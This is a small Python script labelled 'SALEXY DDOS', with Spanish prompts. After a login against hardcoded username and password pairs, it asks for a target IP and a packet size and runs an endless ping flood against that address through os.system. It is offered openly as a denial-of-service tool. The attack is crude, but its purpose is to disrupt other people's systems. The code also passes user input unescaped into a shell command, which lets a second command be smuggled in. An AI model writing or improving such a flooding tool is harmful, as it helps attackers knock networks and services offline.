import os
os.system('pip3 install')
os.system('cls')
os.system('pip3 install colorama')
os.system('cls')
os.system('pip install --upgrade pip')
os.system('cls')
from colorama import init, Fore, Back, Style
init()
print(Fore.BLUE + Style.BRIGHT + "SALEXY DDOS")

usuarios = {
    "Alexxz": "Alex123","Deimoss": "Deimos123"
}

def login():
    username = input(Fore.BLACK + "Ingresa tu nombre de usuario: ")
    password = input(Fore.BLACK + "Ingresa tu contraseña: ")

    if username in usuarios and usuarios[username] == password:
        print(Fore.GREEN + "¡Inicio de sesión exitoso!")
        TARGET_IP = input('IP:')  # Pedir que el Usuario ingrese la IP
        print('# IP:', TARGET_IP)  # Esta línea imprime la IP introducida en un comentario
        SIZE_ATTACK = input('Size:')
        print ('Size:')
        os.system(f'ping {TARGET_IP} -t -l {SIZE_ATTACK}')  # Realiza el ping a la IP ingresada
    else:
        print(Fore.RED + "Credenciales incorrectas. Inténtalo de nuevo.")

login()
